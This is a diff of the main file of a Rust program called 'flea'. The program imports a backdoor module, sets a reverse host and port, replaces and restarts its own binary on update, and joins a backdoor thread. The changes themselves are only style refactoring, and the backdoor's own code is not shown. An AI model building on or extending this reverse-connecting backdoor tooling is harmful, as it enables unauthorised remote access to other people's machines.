@@ -20,20 +20,20 @@ use backdoor::Backdoor;
 extern crate log;
 
 //Change the port number of the server according to your needs
-const SERVER_PORT: &'static str = ":1972";
+const SERVER_PORT: &str = ":1972";
 
 //IP address and the port of the reverse host
-const RHOST: &'static str = "192.168.0.19";
-const RPORT: &'static str = ":1973";
+const RHOST: &str = "192.168.0.19";
+const RPORT: &str = ":1973";
 
-const BACKUP_FILENAME: &'static str = "flea.bak";
-const UPDATE_FILENAME: &'static str = "flea.upd";
+const BACKUP_FILENAME: &str = "flea.bak";
+const UPDATE_FILENAME: &str = "flea.upd";
 
 #[cfg(target_os = "windows")]
-const FLEA_FILE_NAME: &'static str = "flea.exe";
+const FLEA_FILE_NAME: &str = "flea.exe";
 
 #[cfg(target_os = "linux")]
-const FLEA_FILE_NAME: &'static str = "flea";
+const FLEA_FILE_NAME: &str = "flea";
 
 fn print_usage(program: &str, opts: Options) 
 {
@@ -62,9 +62,9 @@ fn main()
     let v: Vec<&str> = pdir.split(&separator).collect();    
     let mut program_dir: String = String::new();
 
-    for i in 0..v.len() - 1
+    for i in v.iter().take(v.len() - 1)
     {
-        if v[i].is_empty()
+        if i.is_empty()
         {
             continue;
         }
@@ -76,7 +76,7 @@ fn main()
             continue;
         }
 
-        program_dir.push_str(&format!("{}{}", separator, &v[i]));
+        program_dir.push_str(&format!("{}{}", separator, &i));
     }
 
     if program_dir.is_empty()
@@ -95,18 +95,18 @@ fn main()
     if std::path::Path::new(BACKUP_FILENAME).exists()
     {
         //Delete the backup file
-        if let Ok(_) = std::fs::remove_file(BACKUP_FILENAME) {}
+        if std::fs::remove_file(BACKUP_FILENAME).is_ok() {}
     }
  
     //Check if restart file exists
     if std::path::Path::new(RESTART_FILENAME).exists()
     {
         //Delete the restart file
-        if let Ok(_) = std::fs::remove_file(RESTART_FILENAME) {}
+        if std::fs::remove_file(RESTART_FILENAME).is_ok() {}
     }
 
     //Finds if there is update available
-    updater::find_update(&program_dir, UPDATE_FILENAME).map(|x| 
+    if let Some(x) = updater::find_update(&program_dir, UPDATE_FILENAME)
     {
         info!("Found update: {}", x);
          //Rename current file to the backup name
@@ -117,7 +117,7 @@ fn main()
         updater::start_new_process(&program_dir, FLEA_FILE_NAME.to_string());
         //Exits the current process
         std::process::exit(exitcode::OK);
-    });
+    };
 
     let my_local_ip = local_ip().unwrap();
     let program = args[0].clone();
@@ -131,7 +131,7 @@ fn main()
     let matches = match opts.parse(&args[1..]) 
     {
         Ok(m) => { m }
-        Err(f) => { println!("{}", f.to_string()); print_usage(&program, opts); return }
+        Err(f) => { println!("{}", f); print_usage(&program, opts); return }
     };
 
     if matches.opt_present("h") 
@@ -158,7 +158,7 @@ fn main()
     
     let mut address = my_local_ip.to_string();
 
-    if host_address.is_some()
+    if let Some(..) = host_address
     {
         address = host_address.unwrap();
     }
@@ -203,7 +203,8 @@ fn main()
 
     handle.join().unwrap();
     handle2.join().unwrap();
-    if backdoor_handle.is_some()
+
+    if let Some(..) = backdoor_handle
     {
         backdoor_handle.unwrap().join().unwrap();
     }
@@ -214,7 +215,7 @@ fn main()
     if std::path::Path::new(RESTART_FILENAME).exists()
     {
         //Delete the restart file
-        if let Ok(_) = std::fs::remove_file(RESTART_FILENAME) {}
+        if std::fs::remove_file(RESTART_FILENAME).is_ok() {}
         //Starts a new process of itself
         updater::start_new_process(&program_dir, FLEA_FILE_NAME.to_string());
 
